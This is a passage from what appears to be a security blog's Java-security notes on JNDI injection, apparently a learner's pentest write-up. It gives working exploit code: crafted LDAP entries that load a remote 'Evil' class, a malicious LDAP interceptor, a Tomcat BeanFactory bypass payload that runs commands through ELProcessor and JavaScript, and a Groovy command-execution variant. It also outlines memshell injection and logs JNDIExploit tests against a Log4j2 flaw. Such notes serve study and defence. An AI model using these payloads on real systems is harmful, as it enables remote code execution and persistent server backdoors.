class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Flower</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>...<br>&#125;<br><br><span class="hljs-type">BasicAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasicAttributes</span>();  <br>attributes.put(<span class="hljs-string">&quot;javaClassName&quot;</span>, Flower.class.getName());  <br>attributes.put(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, bytes);  <br>attributes.put(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaSerializedObject&quot;</span>);<br><br><span class="hljs-keyword">try</span> &#123;  <br>    ctx.bind(<span class="hljs-string">&quot;dc=example,dc=com&quot;</span>, f, attributes);  <br>&#125; <span class="hljs-keyword">catch</span> (NameAlreadyBoundException e) &#123;  <br>    System.out.println(<span class="hljs-string">&quot;Flower already exists, rebind...&quot;</span>);  <br>    ctx.rebind(<span class="hljs-string">&quot;dc=example,dc=com&quot;</span>, f, attributes);  <br>&#125;<br></code></pre></td></tr></table></figure><p>Request a serializable object:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> ctx.lookup(<span class="hljs-string">&quot;dc=example,dc=com&quot;</span>);  <br>System.out.println(f2);<br></code></pre></td></tr></table></figure><p>If the target class exists in client’s class path, then the serialization process starts.</p><h4 id="Referenceable-objects-remote-classloading-via-codebase"><a href="#Referenceable-objects-remote-classloading-via-codebase" class="headerlink" title="Referenceable objects, remote classloading via codebase"></a>Referenceable objects, remote classloading via codebase</h4><blockquote><p>[!NOTE] Restrictions<br>The remote classloading functionality is only included in Oracle JDK. In OpenJDK, you will find there is even no source code about this functionality.<br>After JDK8u191, JDK will check <code>trustURLCodebase</code> before requesting from codebase.<br>The resolving codebase functionality is deprecated in JDK9 and deleted in JDK11.<br><em>(The code in this section are written with JDK7u21)</em></p></blockquote><p>Build a Referencable entry(combine with next section).</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(baseDN);  <br>entry.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);  <br>entry.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);  <br>entry.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);  <br>entry.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, Evil.class.getName());  <br>  <br>result.sendSearchEntry(entry);  <br>result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br></code></pre></td></tr></table></figure><p>When request the LDAP entry:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ctx.lookup(<span class="hljs-string">&quot;ldap://0.0.0.0:2389/ref&quot;</span>);<br></code></pre></td></tr></table></figure><p>A http request will made to <em>codebase</em>, client will download and define the <code>Evil</code> class. Any static code block in <code>Evil</code> will be executed on client.</p><h4 id="LDAP-Interceptor"><a href="#LDAP-Interceptor" class="headerlink" title="LDAP Interceptor"></a>LDAP Interceptor</h4><p>The <code>InMemoryOperationInterceptor</code> class can intercept the process either between receiving requests and reaching the LDAP server, or after processed by LDAP server and before sending result to client.<br>Its <code>processSearchResult()</code> method defines the action before replying to client. We can intercept all results from LDAP server and take easy to return a newly defined <code>Entry</code>.<br>Example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();  <br>  <br>    System.out.println(String.format(<span class="hljs-string">&quot;Request: %s&quot;</span>, base));  <br>  <br>    <span class="hljs-keyword">if</span> (base.toLowerCase().startsWith(<span class="hljs-string">&quot;ser&quot;</span>)) &#123;  <br>        processSerializable(result);  <br>        <span class="hljs-keyword">return</span>;    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (base.toLowerCase().startsWith(<span class="hljs-string">&quot;ref&quot;</span>)) &#123;  <br>        processReferencable(result);  <br>        <span class="hljs-keyword">return</span>;    &#125;  <br>  <br>    System.out.println(String.format(<span class="hljs-string">&quot;Request for %s fail&quot;</span>, base));  <br>result.sendSearchEntry(entry);<br>    result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">2</span>, ResultCode.NO_OPERATION));  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="JNDI-Injection-Bypass"><a href="#JNDI-Injection-Bypass" class="headerlink" title="JNDI Injection Bypass"></a>JNDI Injection Bypass</h1><blockquote><p>After JDK8u191, the remote resolving codebase functionality of LDAP and RMI is disabled by default. So we need to bypass this restriction.</p></blockquote><h2 id="Bypass-using-ObjectFactory-1"><a href="#Bypass-using-ObjectFactory-1" class="headerlink" title="Bypass using ObjectFactory[1]"></a>Bypass using <code>ObjectFactory</code><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖](https://tttang.com/archive/1405/#toc_0x02-xxe-rce)">[1]</span></a></sup></h2><h3 id="Tomcat-Bypass-using-BeanFactory"><a href="#Tomcat-Bypass-using-BeanFactory" class="headerlink" title="Tomcat Bypass using BeanFactory"></a>Tomcat Bypass using <code>BeanFactory</code></h3><blockquote><p>[!NOTE] pre-requirements<br>Tomcat &lt; 8.5.79<br>This vul is repaired in 8.5.79, changelog:<br><em>Disable the <code>forceString</code> option for the JNDI <code>BeanFactory</code> and replace it with an automatic search for an alternative setter with the same name that accepts a <code>String</code>. This is a security hardening measure. (markt)</em></p></blockquote><p>We can specify an arbitrary factory class in the <code>javaFactory</code> attribute.<br>This class will be used to extract the read object from the attacker’s controlled <code>Reference</code> object. It should exist in the target classpath, implement <code>ObjectFactory</code> and has at least one <code>getObjectInstance</code> method.<br>The <code>BeanFactory</code> class within Apache Tomcat Server contains a logic for bean creation by using reflection. The target class should have a public no-argument constructor and public setter with only one <code>String</code> parameter. In fact, <code>BeanFactory</code> contains some logic surrounding how we can specify an arbitrary setter name.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RefAddr</span> <span class="hljs-variable">ra</span> <span class="hljs-operator">=</span> ref.get(<span class="hljs-string">&quot;forceString&quot;</span>);  <br>Map&lt;String, Method&gt; forced = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>String value;  <br>  <br><span class="hljs-keyword">if</span> (ra != <span class="hljs-literal">null</span>) &#123;  <br>    value = (String)ra.getContent();  <br>    Class&lt;?&gt; paramTypes[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">1</span>];  <br>    paramTypes[<span class="hljs-number">0</span>] = String.class;  <span class="hljs-comment">// only modified here</span><br>...<br><span class="hljs-keyword">for</span> (String param: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;  <br>    param = param.trim();  <br>    index = param.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);  <br>    <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;  <br>        setterName = param.substring(index + <span class="hljs-number">1</span>).trim();  <br>        param = param.substring(<span class="hljs-number">0</span>, index).trim();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        setterName = <span class="hljs-string">&quot;set&quot;</span> +  <br>                     param.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +  <br>                     param.substring(<span class="hljs-number">1</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        forced.put(param,  <br>                   beanClass.getMethod(setterName, paramTypes));  <br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>  <br>            (<span class="hljs-string">&quot;Forced String setter &quot;</span> + setterName +  <br>             <span class="hljs-string">&quot; not found for property &quot;</span> + param);  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Consider a “forceString” with content “x&#x3D;eval”, “eval” will become the setter name, the map <code>forced</code> will result in <code>&quot;x&quot;: Method(xx.eval)</code>.<br>Next, <code>BeanFactory</code> extracts all references and finally invoke the setter.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">Enumeration&lt;RefAddr&gt; e = ref.getAll();<br><span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>ra = e.nextElement();  <br><span class="hljs-type">String</span> <span class="hljs-variable">propName</span> <span class="hljs-operator">=</span> ra.getType(); <br>value = (String)ra.getContent();  <br>Object[] valueArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">1</span>];  <br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> forced.get(propName);<br><span class="hljs-keyword">if</span> (method != <span class="hljs-literal">null</span>) &#123;  <br>    valueArray[<span class="hljs-number">0</span>] = value;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        method.invoke(bean, valueArray);  <br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException|  <br>             IllegalArgumentException|  <br>             InvocationTargetException ex) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>  <br>            (<span class="hljs-string">&quot;Forced String setter &quot;</span> + method.getName() +  <br>             <span class="hljs-string">&quot; threw exception for property &quot;</span> + propName);  <br>    &#125;  <br>    <span class="hljs-keyword">continue</span>;  <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>So we can include a string reference to the evil reference with attribute type “x” and put EL expression in the content. As a result, the <code>propName</code> will be “x” and <code>valueArray</code> will contain our EL expression. </p><p>We are writing our own malicious LDAP server (or RMI) that responds with a crafted <code>ResourceRef</code> object:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payloadTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +  <br>        <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +  <br>        <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +  <br>        <span class="hljs-string">&quot;.eval(\&quot;&#123;replacement&#125;\&quot;)&quot;</span> +  <br>        <span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,  <br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);  <br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, payloadTemplate.replace(<span class="hljs-string">&quot;&#123;replacement&#125;&quot;</span>, <span class="hljs-string">&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc.exe&#x27;]).start()&quot;</span>)));<br><br><span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>();<br>e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;java.lang.String&quot;</span>); <span class="hljs-comment">//could be any</span><br>e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Util.serialize(ref));<br><br>result.sendSearchEntry(e);<br>result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br></code></pre></td></tr></table></figure><h3 id="Bypass-using-Groovy"><a href="#Bypass-using-Groovy" class="headerlink" title="Bypass using Groovy"></a>Bypass using Groovy</h3><p>Use the same method as [[#Tomcat Bypass using <code>BeanFactory</code>|ELProcessor]], ELProcessor can be replaced by Groovy, but this require the target to include Groovy in classpath.<br>We can exploit by using the method <code>evaluate</code> within <code>groovy.lang.GroovyShell</code> to execute arbitrary Groovy shell code:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">[<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;/C&#x27;</span>, <span class="hljs-string">&#x27;calc.exe&#x27;</span>].execute();<br></code></pre></td></tr></table></figure><h3 id="Bypass-using-LDAP-Serialized-Object"><a href="#Bypass-using-LDAP-Serialized-Object" class="headerlink" title="Bypass using LDAP Serialized Object"></a>Bypass using LDAP Serialized Object</h3><p>We can use LDAP serialized object entry to contain malicious gadgets. If the client has the vulnerable class in classpath, we will perform a deserialization attack. There is no JDK version restriction on this bypass method.</p><hr><h1 id="JNDI-exploit-tool"><a href="#JNDI-exploit-tool" class="headerlink" title="JNDI exploit tool"></a>JNDI exploit tool</h1><blockquote><p>*Imagine you have found a log4j2 deserializable  vulnerability of an API, you can make the victim server to request an arbitrary JNDI URI, you want to inject a memshell using this breach. *</p></blockquote><h2 id="Structure-and-steps-take-JNDIExploit-project-as-example"><a href="#Structure-and-steps-take-JNDIExploit-project-as-example" class="headerlink" title="Structure and steps(take JNDIExploit project as example)"></a>Structure and steps(take <code>JNDIExploit</code> project as example)</h2><p>In general, a JNDI exploit tool can divide into three parts: </p><ul><li>Choose the way to inject evil class:<ul><li>By register LDAP <code>javaSerializedData</code> entry and directly upload serialized evil class</li><li>By LDAP <code>codebase</code>, remote requesting evil class file</li><li>Using <code>BeanFactory</code> vulnerability, load evil class bytes by <code>EL</code> expression</li></ul></li><li>Define evil class (namely, the memshell loader):<ul><li>Memshell loader should load memshell byte code by reflectively call <code>defineClass</code> method of classloader in current context.</li></ul></li><li>Choose the type of memshell:<ul><li>e.g. by Tomcat Filter&#x2F;Servlet&#x2F;Valve&#x2F;Listener, or Spring Interceptor&#x2F;Controller, etc.</li></ul></li></ul><h3 id="Using-BeanFactory-vul-to-inject-memshell"><a href="#Using-BeanFactory-vul-to-inject-memshell" class="headerlink" title="Using BeanFactory vul to inject memshell"></a>Using <code>BeanFactory</code> vul to inject memshell</h3><p>Exploit <code>BeanFacotory</code>‘s vul, we can execute arbitrary EL expression by <code>ELProcessor</code>, but only one EL sentence would be run. So we should pack the evil class loader into JavaScript and execute JS code by JavaScript engine.</p><hr><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><h2 id="Process-of-JNDI-injection-and-Deserialization"><a href="#Process-of-JNDI-injection-and-Deserialization" class="headerlink" title="Process of JNDI injection and Deserialization"></a>Process of JNDI injection and Deserialization</h2><p>JNDI injection covers the exploitation of deserialization. The following is the conclusion of how to inject memshell by using JNDI injection and deserialization vuls.</p><ol><li><p>Deserialization</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">Kick-off: a vulnerable readObject()<br>Sink: run arbitrary code by<br>define a<span class="hljs-built_in"> new </span>class from byte<span class="hljs-built_in"> array </span>and construct<span class="hljs-built_in"> new </span>instance. e.g. TemplatesImpl<br>inject memshell in<span class="hljs-keyword"> static</span> code block<span class="hljs-built_in"> or </span>constructor<br>define memshell class from byte<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>obtain Request object <br>inject memshell into context<br><br><br></code></pre></td></tr></table></figure></li><li><p>JNDI injection</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs smali">Kick-off: a vulnerable lookup()<br>Sink: <br>Serialzable: same as deserialization vul<br>Referencable: <br>remote classloading<br>bypass using BeanFactory:<br>use script engine, e.g. ELProcessor, JavaScript, Groovy, BeanShell<br>construct script:<br>define an evil class from byte<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>inject memshell in<span class="hljs-keyword"> static</span> code block<span class="hljs-built_in"> or </span>constructor, e.g. TomcatMemshellTemplate1<br>define memshell class from byte<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>obtain Request object <br>inject memshell into context<br></code></pre></td></tr></table></figure></li></ol><hr><h1 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h1><h2 id="JNDIExploit-functions-test-on-Log4j2-vul"><a href="#JNDIExploit-functions-test-on-Log4j2-vul" class="headerlink" title="JNDIExploit functions test on Log4j2 vul"></a>JNDIExploit functions test on Log4j2 vul</h2><blockquote><p><em>As for spring web server, those payload targeted to tomcat would lose efficiency</em></p></blockquote><blockquote><p><code>TomcatBypass</code> use <code>BeanFactory</code> to execute payload<br><code>Basic</code> would remote request payload</p></blockquote><ul><li><code>TomcatBypass/SpringMemshell</code>: successfully rce</li><li><code>TomcatBypass/TomcatMemshell</code>: fail</li><li><code>TomcatBypass/GodzillaMemshell</code>: success</li><li><code>Basic/SpringMemshell</code>: fail</li><li><code>Deserilization/Jre8u20/SpringMemshell</code>: fail</li></ul><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> Reproduce Tomcat memshell, Filter&#x2F;Listener&#x2F;Valve</li><li><input checked="" disabled="" type="checkbox"> Explore Spring source code, reproduce Spring memshell</li><li><input disabled="" type="checkbox"> Reproduce java agent memshell</li><li><input checked="" disabled="" type="checkbox"> Explore deserializable entry points: LDAP <code>codebase</code>, <code>javaSerializeData</code>, <code>BeanFactory</code> vul, common gadgets; Read source code of <code>ysoserial</code>, reproduce exploitation of gadgets</li><li><input checked="" disabled="" type="checkbox"> Explore methods to load payload’s byte code, <code>ASM</code>, <code>ClassWriter</code></li><li><input checked="" disabled="" type="checkbox"> Learn <code>Instrument</code> and <code>javassit</code></li><li><input disabled="" type="checkbox"> Explore <code>JNDI-Inject-Tool</code> and <code>JYso</code> tool.</li><li><input checked="" disabled="" type="checkbox"> Research how to inject tomcat memshell via deserialization vul<ul><li><input checked="" disabled="" type="checkbox"> Failed to echo by dynamically generating evil class in <code>TomcatEcho</code>. Try loading the byte code of compiled evil class and modify <code>Gadgets.createTemplatesImpl</code></li><li><input checked="" disabled="" type="checkbox"> Echo header </li><li><input checked="" disabled="" type="checkbox"> Inject memshell</li></ul></li><li><input disabled="" type="checkbox"> Research agent memshell in <code>JNDIExploit</code></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><section class="footnotes"><h2>Reference</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://tttang.com/archive/1405/#toc_0x02-xxe-rce">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显 | 回忆飘如雪</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.secpulse.com/archives/200930.html">Java反序列化回显学习之Tomcat通用回显 - SecPulse.COM | 安全脉搏</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
      <category>JavaSec</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
